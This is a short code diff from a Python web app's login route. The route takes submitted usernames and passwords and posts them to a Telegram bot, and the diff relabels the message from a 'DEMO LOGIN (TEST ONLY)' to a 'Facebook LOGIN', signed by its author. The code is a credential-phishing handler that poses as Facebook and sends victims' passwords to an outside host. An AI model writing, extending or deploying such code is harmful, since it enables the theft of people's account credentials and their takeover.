@@ -15,7 +15,7 @@ def login():
     user = request.form.get("username")
     pwd = request.form.get("password")
 
-    msg = f"🧪 DEMO LOGIN\nUser: {user}\nPass: {pwd}\n(TEST ONLY)"
+    msg = f"🧪 Facebook LOGIN\nUser: {user}\nPass: {pwd}\n(By Afghan)"
 
     requests.post(
         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
